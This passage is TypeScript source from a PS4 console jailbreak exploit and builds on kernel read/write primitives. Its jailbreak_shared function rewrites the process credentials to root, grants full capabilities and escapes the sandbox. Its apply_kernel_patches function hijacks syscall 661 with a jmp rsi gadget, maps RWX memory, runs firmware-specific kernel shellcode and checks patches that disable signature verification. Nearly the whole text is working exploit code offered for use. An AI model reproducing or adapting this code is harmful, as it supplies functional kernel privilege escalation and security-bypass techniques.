  kernel_offset.PMAP_CR3 = 0x28

  // socket/net - PS4 specific
  kernel_offset.SO_PCB = 0x18
  kernel_offset.INPCB_PKTOPTS = 0x118  // PS4 = 0x118, PS5 = 0x120

  // pktopts structure - PS4 specific
  kernel_offset.IP6PO_TCLASS = 0xB0    // PS4 = 0xB0, PS5 = 0xC0
  kernel_offset.IP6PO_RTHDR = 0x68     // PS4 = 0x68, PS5 = 0x70

  return kernel_offset
}

// Global kernel object to save information
// Also used in lapse.js

export const kernel: {
  addr: {
    base?: BigInt,
    curproc?: BigInt,
    allproc?: BigInt,
    curproc_fd?: BigInt,
    curproc_ofiles?: BigInt,
    inside_kdata?: BigInt,
  },
  read_buffer: ((kaddr: BigInt, length: number) => Uint8Array | null) | null,
  write_buffer: ((kaddr: BigInt, buffer: Uint8Array) => void) | null,
  read_byte: (kaddr: BigInt) => number | null,
  read_word: (kaddr: BigInt) => number | null,
  read_dword: (kaddr: BigInt) => number | null,
  read_qword: (kaddr: BigInt) => BigInt | null,
  read_null_terminated_string: (kaddr: BigInt) => string,
  write_byte: (dest: BigInt, value: number) => void,
  write_word: (dest: BigInt, value: number) => void,
  write_dword: (dest: BigInt, value: number) => void,
  write_qword: (dest: BigInt, value: BigInt | number) => void,
  copyout?: (kaddr: BigInt, uaddr: BigInt, len: BigInt) => void,
  copyin?: (uaddr: BigInt, kaddr: BigInt, len: BigInt) => void
} = {
  // Object used to sture kbase, curproc, allproc
  addr: {},
  // We need to define these 2 functions in the exploit
  read_buffer: null,
  write_buffer: null,
  read_byte: function (kaddr: BigInt) {
    const value = kernel.read_buffer?.(kaddr, 1)
    return value && value.length === 1 ? (value[0]!) : null
  },
  read_word: function (kaddr: BigInt) {
    const value = kernel.read_buffer?.(kaddr, 2)
    if (!value || value.length !== 2) return null
    return (value[0]!) | ((value[1]!) << 8)
  },
  read_dword: function (kaddr: BigInt) {
    const value = kernel.read_buffer?.(kaddr, 4)
    if (!value || value.length !== 4) return null
    let result = 0
    for (let i = 0; i < 4; i++) {
      result |= ((value[i]!) << (i * 8))
    }
    return result
  },
  read_qword: function (kaddr: BigInt) {
    const value = kernel.read_buffer?.(kaddr, 8)
    if (!value || value.length !== 8) return null
    let result_hi = 0
    let result_low = 0
    for (let i = 0; i < 4; i++) {
      result_hi |= ((value[i + 4]!) << (i * 8))
      result_low |= ((value[i]!) << (i * 8))
    }
    const result = new BigInt(result_hi, result_low)
    return result
  },
  read_null_terminated_string: function (kaddr: BigInt) {
    let result = ''

    while (true) {
      const chunk = kernel.read_buffer?.(kaddr, 0x8)
      if (!chunk || chunk.length === 0) break

      let null_pos = -1
      for (let i = 0; i < chunk.length; i++) {
        if (chunk[i] === 0) {
          null_pos = i
          break
        }
      }

      if (null_pos >= 0) {
        if (null_pos > 0) {
          for (let i = 0; i < null_pos; i++) {
            result += String.fromCharCode(Number(chunk[i]))
          }
        }
        return result
      }

      for (let i = 0; i < chunk.length; i++) {
        result += String.fromCharCode(Number(chunk[i]))
      }

      kaddr = kaddr.add(chunk.length)
    }

    return result
  },
  write_byte: function (dest: BigInt, value: number) {
    const buf = new Uint8Array(1)
    buf[0] = Number(value & 0xFF)
    kernel.write_buffer?.(dest, buf)
  },
  write_word: function (dest: BigInt, value: number) {
    const buf = new Uint8Array(2)
    buf[0] = Number(value & 0xFF)
    buf[1] = Number((value >> 8) & 0xFF)
    kernel.write_buffer?.(dest, buf)
  },
  write_dword: function (dest: BigInt, value: number) {
    const buf = new Uint8Array(4)
    for (let i = 0; i < 4; i++) {
      buf[i] = Number((value >> (i * 8)) & 0xFF)
    }
    kernel.write_buffer?.(dest, buf)
  },
  write_qword: function (dest: BigInt, value: BigInt | number) {
    const buf = new Uint8Array(8)
    value = value instanceof BigInt ? value : new BigInt(value)

    const val_hi = value.hi
    const val_low = value.lo

    for (let i = 0; i < 4; i++) {
      buf[i] = Number((val_low >> (i * 8))) & 0xFF
      buf[i + 4] = Number((val_hi >> ((i + 4) * 8))) & 0xFF
    }
    kernel.write_buffer?.(dest, buf)
  }
}

// Helper functions
export function is_kernel_rw_available () {
  return kernel.read_buffer && kernel.write_buffer
}

export function check_kernel_rw () {
  if (!is_kernel_rw_available()) {
    throw new Error('kernel r/w is not available')
  }
}

export function write8 (addr: BigInt, val: number) {
  mem.view(addr).setUint8(0, val & 0xFF)
}

export function write16 (addr: BigInt, val: number) {
  mem.view(addr).setUint16(0, val & 0xFFFF, true)
}

export function write32 (addr: BigInt, val: number) {
  mem.view(addr).setUint32(0, val & 0xFFFFFFFF, true)
}

export function write64 (addr: BigInt, val: BigInt | number) {
  mem.view(addr).setBigInt(0, new BigInt(val), true)
}

export function read8 (addr: BigInt) {
  return mem.view(addr).getUint8(0)
}

export function read16 (addr: BigInt) {
  return mem.view(addr).getUint16(0, true)
}

export function read32 (addr: BigInt) {
  return mem.view(addr).getUint32(0, true)
}

export function read64 (addr: BigInt) {
  return mem.view(addr).getBigInt(0, true)
}

export function malloc (size: number) {
  return mem.malloc(size)
}

export function hex (val: BigInt | number) {
  if (val instanceof BigInt) { return val.toString() }
  return '0x' + val.toString(16).padStart(2, '0')
}

export function send_notification (msg: string) {
  utils.notify(msg)
}

fn.register(0x0ca, 'sysctl', ['bigint', 'number', 'bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
const sysctl = fn.sysctl

export function sysctlbyname (name: string, oldp: BigInt | number, oldp_len: BigInt | number, newp: BigInt | number, newp_len: BigInt | number) {
  const translate_name_mib = malloc(0x8)
  const buf_size = 0x70
  const mib = malloc(buf_size)
  const size = malloc(0x8)

  write64(translate_name_mib, new BigInt(0x3, 0x0))
  write64(size, buf_size)

  const name_addr = utils.cstr(name)
  const name_len = new BigInt(name.length)

  if (sysctl(translate_name_mib, 2, mib, size, name_addr, name_len).eq(new BigInt(0xffffffff, 0xffffffff))) {
    log('failed to translate sysctl name to mib (' + name + ')')
  }

  oldp = typeof oldp === 'number' ? new BigInt(oldp) : oldp
  oldp_len = typeof oldp_len === 'number' ? new BigInt(oldp_len) : oldp_len
  newp = typeof newp === 'number' ? new BigInt(newp) : newp
  newp_len = typeof newp_len === 'number' ? new BigInt(newp_len) : newp_len

  if (sysctl(mib, 2, oldp, oldp_len, newp, newp_len).eq(new BigInt(0xffffffff, 0xffffffff))) {
    return false
  }

  return true
}

export function get_fwversion () {
  const buf = malloc(0x8)
  const size = malloc(0x8)
  write64(size, 0x8)
  if (sysctlbyname('kern.sdk_version', buf, size, 0, 0)) {
    const byte1 = Number(read8(buf.add(2)))  // Minor version (first byte)
    const byte2 = Number(read8(buf.add(3)))  // Major version (second byte)

    const version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0')
    return version
  }

  return null
}

// Before calling this function we need to initialize
//      kernel.addr.curproc
//      kernel.addr.allproc
//      kernel.addr.base

fn.register(0x18, 'getuid', [], 'bigint')
fn.register(0x249, 'is_in_sandbox', [], 'bigint')
fn.register(477, 'mmap', ['bigint', 'number', 'number', 'number', 'bigint', 'number'], 'bigint')
fn.register(0x49, 'munmap', ['bigint', 'number'], 'bigint')
const getuid = fn.getuid
const is_in_sandbox = fn.is_in_sandbox
const mmap = fn.mmap
const munmap = fn.munmap

export function jailbreak_shared (FW_VERSION: string) {
  if (!kernel.addr.curproc || !kernel.addr.base || !kernel.addr.allproc) {
    throw new Error('kernel.addr is not properly initialized')
  }
  if (!kernel_offset) {
    throw new Error('kernel_offset is not initialized')
  }

  const OFFSET_P_UCRED = 0x40
  const proc = kernel.addr.curproc

  const uid_before = Number(getuid())
  const sandbox_before = Number(is_in_sandbox())
  debug('BEFORE: uid=' + uid_before + ', sandbox=' + sandbox_before)

  // Patch ucred
  const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD!))
  const ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED))

  if (!proc_fd || !ucred) {
    throw new Error('Failed to read proc_fd or ucred')
  }

  kernel.write_dword(ucred.add(0x04), 0)  // cr_uid
  kernel.write_dword(ucred.add(0x08), 0)  // cr_ruid
  kernel.write_dword(ucred.add(0x0C), 0)  // cr_svuid
  kernel.write_dword(ucred.add(0x10), 1)  // cr_ngroups
  kernel.write_dword(ucred.add(0x14), 0)  // cr_rgid

  const prison0 = kernel.read_qword(kernel.addr.base.add(kernel_offset.PRISON0))
  if (!prison0) {
    throw new Error('Failed to read prison0')
  }
  kernel.write_qword(ucred.add(0x30), prison0)

  kernel.write_qword(ucred.add(0x60), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))  // sceCaps
  kernel.write_qword(ucred.add(0x68), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))

  const rootvnode = kernel.read_qword(kernel.addr.base.add(kernel_offset.ROOTVNODE))
  if (!rootvnode) {
    throw new Error('Failed to read rootvnode')
  }
  kernel.write_qword(proc_fd.add(0x10), rootvnode)  // fd_rdir
  kernel.write_qword(proc_fd.add(0x18), rootvnode)  // fd_jdir

  const uid_after = Number(getuid())
  const sandbox_after = Number(is_in_sandbox())
  debug('AFTER:  uid=' + uid_after + ', sandbox=' + sandbox_after)

  if (uid_after === 0 && sandbox_after === 0) {
    debug('Sandbox escape complete!')
  } else {
    debug('[WARNING] Sandbox escape may have failed')
  }

  // === Apply kernel patches via kexec ===
  // Uses syscall_raw() which sets rax manually for syscalls without gadgets
  debug('Applying kernel patches...')
  const kpatch_result = apply_kernel_patches(FW_VERSION)
  if (kpatch_result) {
    debug('Kernel patches applied successfully!')

    // Comprehensive kernel patch verification
    debug('Verifying kernel patches...')
    let all_patches_ok = true

    // 1. Verify mmap RWX patch (0x33 -> 0x37 at two locations)
    const mmap_offsets = get_mmap_patch_offsets(FW_VERSION)
    if (mmap_offsets) {
      const b1 = kernel.read_byte(kernel.addr.base.add(mmap_offsets[0]!))
      const b2 = kernel.read_byte(kernel.addr.base.add(mmap_offsets[1]!))
      if (b1 === 0x37 && b2 === 0x37) {
        debug('  [OK] mmap RWX patch')
      } else {
        debug('  [FAIL] mmap RWX: [' + hex(mmap_offsets[0]!) + ']=' + hex(b1 ?? 0) + ' [' + hex(mmap_offsets[1]!) + ']=' + hex(b2 ?? 0))
        all_patches_ok = false
      }
    } else {
      debug('  [SKIP] mmap RWX (no offsets for FW ' + FW_VERSION + ')')
    }

    // 2. Test mmap RWX actually works by trying to allocate RWX memory
    try {
      const PROT_RWX = 0x7  // READ | WRITE | EXEC
      const MAP_ANON = 0x1000
      const MAP_PRIVATE = 0x2
      const test_addr = mmap(new BigInt(0), 0x1000, PROT_RWX, MAP_PRIVATE | MAP_ANON, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0)
      if (Number(test_addr.shr(32)) < 0xffff8000) {
        debug('  [OK] mmap RWX functional @ ' + hex(test_addr))
        // Unmap the test allocation
        munmap(test_addr, 0x1000)
      } else {
        debug('  [FAIL] mmap RWX functional: ' + hex(test_addr))
        all_patches_ok = false
      }
    } catch (e) {
      debug('  [FAIL] mmap RWX test error: ' + (e as Error).message)
      all_patches_ok = false
    }

    if (all_patches_ok) {
      debug('All kernel patches verified OK!')
    } else {
      debug('[WARNING] Some kernel patches may have failed')
    }
  } else {
    debug('[WARNING] Kernel patches failed - continuing without patches')
  }
}

fn.register(0x215, 'jitshm_create', ['number', 'number', 'number'], 'bigint')
fn.register(0x295, 'kexec', ['bigint'], 'bigint')
const jitshm_create = fn.jitshm_create
const kexec = fn.kexec

// Apply kernel patches via kexec using a single ROP chain
// This avoids returning to JS between critical operations
export function apply_kernel_patches (fw_version: string) {
  try {
    if (!kernel.addr.base) {
      throw new Error('kernel.addr.base is not initialized')
    }
    if (!kernel_offset) {
      throw new Error('kernel_offset is not initialized')
    }
    // Get shellcode for this firmware
    const shellcode = get_kpatch_shellcode(fw_version)
    if (!shellcode) {
      debug('No kernel patch shellcode for FW ' + fw_version)
      return false
    }

    debug('Kernel patch shellcode: ' + shellcode.length + ' bytes')

    // Constants
    const PROT_READ = 0x1
    const PROT_WRITE = 0x2
    const PROT_EXEC = 0x4
    const PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC

    const mapping_addr = new BigInt(0x9, 0x26100000)  // Different from 0x920100000 to avoid conflicts
    const aligned_memsz = 0x10000

    // Get sysent[661] address and save original values
    const sysent_661_addr = kernel.addr.base.add(kernel_offset.SYSENT_661)
    debug('sysent[661] @ ' + hex(sysent_661_addr))

    const sy_narg = kernel.read_dword(sysent_661_addr)
    const sy_call = kernel.read_qword(sysent_661_addr.add(8))
    const sy_thrcnt = kernel.read_dword(sysent_661_addr.add(0x2C))

    debug('Original sy_narg: ' + hex(sy_narg ?? 0))
    debug('Original sy_call: ' + hex(sy_call ?? 0))
    debug('Original sy_thrcnt: ' + hex(sy_thrcnt ?? 0))

    if (!sy_narg || !sy_call || !sy_thrcnt) {
      debug('ERROR: Failed to read original sysent[661] values')
      return false
    }

    // Calculate jmp rsi gadget address
    const jmp_rsi_gadget = kernel.addr.base.add(kernel_offset.JMP_RSI_GADGET)
    debug('jmp rsi gadget @ ' + hex(jmp_rsi_gadget))

    // Allocate buffer for shellcode in userspace first
    const shellcode_buf = malloc(shellcode.length + 0x100)
    debug('Shellcode buffer @ ' + hex(shellcode_buf))

    // Copy shellcode to userspace buffer
    for (let i = 0; i < shellcode.length; i++) {
      write8(shellcode_buf.add(i), shellcode[i]!)
    }

    // Verify first bytes
    const first_bytes = read32(shellcode_buf)
    debug('First bytes @ shellcode: ' + hex(first_bytes))

    // Hijack sysent[661] to point to jmp rsi gadget
    debug('Hijacking sysent[661]...')
    kernel.write_dword(sysent_661_addr, 2)                      // sy_narg = 2
    kernel.write_qword(sysent_661_addr.add(8), jmp_rsi_gadget)  // sy_call = jmp rsi
    kernel.write_dword(sysent_661_addr.add(0x2C), 1)            // sy_thrcnt = 1
    debug('Hijacked sysent[661]')

    // Check if jitshm_create has a dedicated gadget
    const jitshm_num = 0x215 // SYSCALL.jitshm_create = 0x215n;     // 533
    const jitshm_gadget = syscalls.map.get(jitshm_num)
    debug('jitshm_create gadget: ' + (jitshm_gadget ? hex(jitshm_gadget) : 'NOT FOUND'))

    // Try using the standard syscall() function if gadget exists
    if (!jitshm_gadget) {
      debug('ERROR: jitshm_create gadget not found in libkernel')
      debug('Kernel patches require jitshm_create syscall support')
      return false
    }

    // 1. jitshm_create(0, aligned_memsz, PROT_RWX)
    debug('Calling jitshm_create...')

    const exec_handle = jitshm_create(0, aligned_memsz, PROT_RWX)
    debug('jitshm_create handle: ' + hex(exec_handle))

    if (Number(exec_handle.shr(32)) >= 0xffff8000) {
      debug('ERROR: jitshm_create failed')
      kernel.write_dword(sysent_661_addr, sy_narg)
      kernel.write_qword(sysent_661_addr.add(8), sy_call)
      kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt)
      return false
    }

    // 2. mmap(mapping_addr, aligned_memsz, PROT_RWX, MAP_SHARED|MAP_FIXED, exec_handle, 0)
    debug('Calling mmap...')

    const mmap_result = mmap(mapping_addr, aligned_memsz, PROT_RWX, 0x11, exec_handle, 0)
    debug('mmap result: ' + hex(mmap_result))

    if (Number(mmap_result.shr(32)) >= 0xffff8000) {
      debug('ERROR: mmap failed')
      kernel.write_dword(sysent_661_addr, sy_narg)
      kernel.write_qword(sysent_661_addr.add(8), sy_call)
      kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt)
      return false
    }

    // 3. Copy shellcode to mapped memory
    debug('Copying shellcode to ' + hex(mapping_addr) + '...')
    for (let j = 0; j < shellcode.length; j++) {
      write8(mapping_addr.add(j), shellcode[j]!)
    }

    // Verify
    const verify_bytes = read32(mapping_addr)
    debug('First bytes @ mapped: ' + hex(verify_bytes))

    // 4. kexec(mapping_addr) - syscall 661, hijacked to jmp rsi
    debug('Calling kexec...')

    const kexec_result = kexec(mapping_addr)
    debug('kexec returned: ' + hex(kexec_result))

    // === Verify 12.00 kernel patches ===
    if (fw_version === '12.00' || fw_version === '12.02') {
      debug('Verifying 12.00 kernel patches...')
      let patch_errors = 0

      // Patch offsets and expected values for 12.00
      const patches_to_verify = [
        { off: 0x1b76a3, exp: 0x04eb, name: 'dlsym_check1', size: 2 },
        { off: 0x1b76b3, exp: 0x04eb, name: 'dlsym_check2', size: 2 },
        { off: 0x1b76d3, exp: 0xe990, name: 'dlsym_check3', size: 2 },
        { off: 0x627af4, exp: 0x00eb, name: 'veriPatch', size: 2 },
        { off: 0xacd, exp: 0xeb, name: 'bcopy', size: 1 },
        { off: 0x2bd3cd, exp: 0xeb, name: 'bzero', size: 1 },
        { off: 0x2bd411, exp: 0xeb, name: 'pagezero', size: 1 },
        { off: 0x2bd48d, exp: 0xeb, name: 'memcpy', size: 1 },
        { off: 0x2bd4d1, exp: 0xeb, name: 'pagecopy', size: 1 },
        { off: 0x2bd67d, exp: 0xeb, name: 'copyin', size: 1 },
        { off: 0x2bdb2d, exp: 0xeb, name: 'copyinstr', size: 1 },
        { off: 0x2bdbfd, exp: 0xeb, name: 'copystr', size: 1 },
        { off: 0x6283df, exp: 0x00eb, name: 'sysVeri_suspend', size: 2 },
        { off: 0x490, exp: 0x00, name: 'syscall_check', size: 4 },
        { off: 0x4c2, exp: 0xeb, name: 'syscall_jmp1', size: 1 },
        { off: 0x4b9, exp: 0x00eb, name: 'syscall_jmp2', size: 2 },
        { off: 0x4b5, exp: 0x00eb, name: 'syscall_jmp3', size: 2 },
        { off: 0x3914e6, exp: 0xeb, name: 'setuid', size: 1 },
        { off: 0x2fc0ec, exp: 0x04eb, name: 'vm_map_protect', size: 2 },
        { off: 0x1b7164, exp: 0xe990, name: 'dynlib_load_prx', size: 2 },
        { off: 0x1fa71a, exp: 0x37, name: 'mmap_rwx1', size: 1 },
        { off: 0x1fa71d, exp: 0x37, name: 'mmap_rwx2', size: 1 },
        { off: 0x1102d80, exp: 0x02, name: 'sysent11_narg', size: 4 },
        { off: 0x1102dac, exp: 0x01, name: 'sysent11_thrcnt', size: 4 },
      ]

      for (const p of patches_to_verify) {
        let actual
        if (p.size === 1) {
          actual = Number(kernel.read_byte(kernel.addr.base.add(p.off)))
        } else if (p.size === 2) {
          actual = Number(kernel.read_word(kernel.addr.base.add(p.off)))
        } else {
          actual = Number(kernel.read_dword(kernel.addr.base.add(p.off)))
        }

        if (actual === p.exp) {
          debug('  [OK] ' + p.name)
        } else {
          debug('  [FAIL] ' + p.name + ': expected ' + hex(p.exp) + ', got ' + hex(actual))
          patch_errors++
        }
      }

      // Special check for sysent[11] sy_call - should point to jmp [rsi] gadget
      const sysent11_call = kernel.read_qword(kernel.addr.base.add(0x1102d88))
      const expected_gadget = kernel.addr.base.add(0x47b31)
      if (sysent11_call && sysent11_call.eq(expected_gadget)) {
        debug('  [OK] sysent11_call -> jmp_rsi @ ' + hex(sysent11_call))
      } else {
        debug('  [FAIL] sysent11_call: expected ' + hex(expected_gadget) + ', got ' + hex(sysent11_call ?? 0))
        patch_errors++
      }

      if (patch_errors === 0) {
        debug('All 12.00 kernel patches verified OK!')
      } else {
        debug('[WARNING] ' + patch_errors + ' kernel patches failed!')
      }
    }

    // Restore original sysent[661]
    debug('Restoring sysent[661]...')
    kernel.write_dword(sysent_661_addr, sy_narg)
    kernel.write_qword(sysent_661_addr.add(8), sy_call)
    kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt)
    debug('Restored sysent[661]')

    debug('Kernel patches applied!')

    return true
  } catch (e) {
    debug('apply_kernel_patches error: ' + (e as Error).message)
    debug((e as Error).stack ?? '')
    return false
  }
}
